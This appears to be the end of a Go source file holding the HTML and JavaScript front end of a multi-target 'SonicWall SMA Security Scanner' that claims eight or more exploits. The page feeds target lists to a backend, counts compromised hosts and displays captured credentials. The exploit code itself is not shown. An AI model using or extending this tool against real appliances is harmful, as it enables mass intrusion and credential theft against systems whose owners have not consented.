        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #7f8c8d; }
        textarea, input {
            width: 100%;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border: 1px solid #00f3ff;
            border-radius: 8px;
            color: #00f3ff;
            font-family: monospace;
        }
        button {
            background: linear-gradient(135deg, #0066ff, #00ccff);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
        }
        button:hover { transform: scale(1.02); }
        .btn-danger { background: linear-gradient(135deg, #ff0066, #ff3300); }
        .btn-success { background: linear-gradient(135deg, #00cc66, #00ff99); }
        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
        .progress-bar {
            width: 100%;
            height: 30px;
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00f3ff, #00ff9d);
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #000;
            font-weight: bold;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .stat-card {
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        .stat-value { font-size: 2em; font-weight: bold; }
        .log-area {
            background: rgba(0,0,0,0.7);
            border-radius: 10px;
            padding: 15px;
            height: 400px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        .log-compromised { color: #ff0000; font-weight: bold; }
        .log-vulnerable { color: #ff6600; }
        .log-cred { color: #ff00ff; }
        .log-valid { color: #00ff9d; }
        .log-error { color: #ffaa44; }
        .info-text { color: #7f8c8d; font-size: 12px; margin-top: 5px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>SonicWall SMA Security Scanner</h1>
        <p>Multi-threaded | 8+ Exploits | Go</p>
        <div class="badge">FOR AUTHORIZED TESTING ONLY</div>
    </div>

    <div class="grid">
        <div class="card">
            <h2>Targets</h2>
            <div class="form-group">
                <label>Format: ip / ip:port / ip:port:user:pass (one per line)</label>
                <textarea id="targetsInput" rows="8" placeholder="192.168.1.1&#10;10.0.0.1:443&#10;192.168.1.100:8443:admin:password&#10;8.8.8.8:4433"></textarea>
            </div>
            <div class="flex">
                <button onclick="loadFile()">Load File</button>
                <button onclick="clearTargets()">Clear</button>
                <button onclick="addExample()">Example</button>
            </div>
            <div class="info-text">Supports: just IP, IP:port, or IP:port:username:password</div>
        </div>

        <div class="card">
            <h2>Settings</h2>
            <div class="form-group">
                <label>Threads (1-20)</label>
                <input type="number" id="threads" value="5" min="1" max="20">
            </div>
            <div class="flex">
                <button onclick="startScan()" class="btn-success">START SCAN</button>
                <button onclick="stopScan()" class="btn-danger">STOP</button>
            </div>
        </div>
    </div>

    <div class="card">
        <h2>Progress</h2>
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill" style="width:0%">0%</div>
        </div>
        <div class="stats">
            <div class="stat-card"><div class="stat-value" id="checkedCount">0</div><div>Checked</div></div>
            <div class="stat-card"><div class="stat-value" id="totalCount">0</div><div>Total</div></div>
            <div class="stat-card"><div class="stat-value" id="compromisedCount" style="color:#ff0000">0</div><div>COMPROMISED</div></div>
            <div class="stat-card"><div class="stat-value" id="vulnerableCount" style="color:#ff6600">0</div><div>VULNERABLE</div></div>
        </div>
    </div>

    <div class="card">
        <h2>Live Results</h2>
        <div class="log-area" id="logArea">
            <div class="log-entry log-valid">Scanner Ready. Load targets and click START.</div>
        </div>
    </div>
</div>

<script>
let ws = null;
let scanActive = false;

function connectWebSocket() {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    ws = new WebSocket(protocol + "//" + window.location.host + "/ws");
    ws.onopen = () => addLog("WebSocket connected", "valid");
    ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        if (data.type === "error") {
            addLog("Error: " + data.message, "error");
        } else if (data.type === "started") {
            scanActive = true;
            document.getElementById("totalCount").innerText = data.total;
            addLog("Scan started: " + data.total + " targets", "valid");
        }
        else if (data.type === "progress") {
            document.getElementById("checkedCount").innerText = data.checked;
            document.getElementById("compromisedCount").innerText = data.compromised || 0;
            document.getElementById("vulnerableCount").innerText = data.vulnerable || 0;
            document.getElementById("progressFill").style.width = data.progress + "%";
            document.getElementById("progressFill").innerText = data.progress.toFixed(1) + "%";
            if (data.result) addResultLog(data.result);
        }
        else if (data.type === "complete") {
            addLog("SCAN COMPLETE - Compromised: " + data.compromised + ", Vulnerable: " + data.vulnerable, "valid");
            scanActive = false;
        }
        else if (data.type === "stopped") {
            addLog("Scan stopped", "error");
            scanActive = false;
        }
    };
    ws.onclose = () => setTimeout(connectWebSocket, 3000);
}

function addResultLog(r) {
    let cls = r.access === "compromised" ? "log-compromised" : (r.access === "vulnerable" ? "log-vulnerable" : "log-error");
    addLog("[" + r.access.toUpperCase() + "] " + r.target, cls);
    for (let e of r.exploits) {
        if (e.vulnerable && e.credentials && e.credentials.length > 0) {
            for (let c of e.credentials) addLog("  CRED: " + c, "log-cred");
        }
    }
}

function addLog(msg, type) {
    const log = document.getElementById("logArea");
    const div = document.createElement("div");
    div.className = "log-entry " + (type || "");
    div.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
    log.appendChild(div);
    div.scrollIntoView();
}

function parseTargets() {
    const text = document.getElementById("targetsInput").value;
    const lines = text.split("\n");
    const targets = [];
    for (let line of lines) {
        line = line.trim();
        if (!line || line.startsWith("#")) continue;
        const parts = line.split(":");
        if (parts.length === 1) {
            targets.push({host: parts[0], port: "443", username: "", password: ""});
        } else if (parts.length === 2) {
            targets.push({host: parts[0], port: parts[1], username: "", password: ""});
        } else if (parts.length >= 4) {
            targets.push({host: parts[0], port: parts[1], username: parts[2], password: parts[3]});
        }
    }
    return targets;
}

function startScan() {
    const targets = parseTargets();
    if (targets.length === 0) {
        addLog("No targets found!", "error");
        return;
    }
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        addLog("WebSocket not connected", "error");
        return;
    }
    const threads = parseInt(document.getElementById("threads").value) || 5;
    ws.send(JSON.stringify({
        action: "start_scan",
        targets: targets,
        threads: threads
    }));
    addLog("Starting scan of " + targets.length + " targets", "valid");
}

function stopScan() {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({action: "stop_scan"}));
    }
}

function loadFile() {
    const input = document.createElement("input");
    input.type = "file";
    input.accept = ".txt";
    input.onchange = function(e) {
        const file = e.target.files[0];
        const reader = new FileReader();
        reader.onload = function(evt) {
            document.getElementById("targetsInput").value = evt.target.result;
            addLog("Loaded: " + file.name, "valid");
        };
        reader.readAsText(file);
    };
    input.click();
}

function clearTargets() {
    document.getElementById("targetsInput").value = "";
    addLog("Targets cleared", "info");
}

function addExample() {
    document.getElementById("targetsInput").value = "192.168.1.1\n10.0.0.1:443\n192.168.1.100:8443:admin:password\n8.8.8.8:4433";
    addLog("Example added", "valid");
}

connectWebSocket();
</script>
</body>
</html>`
}
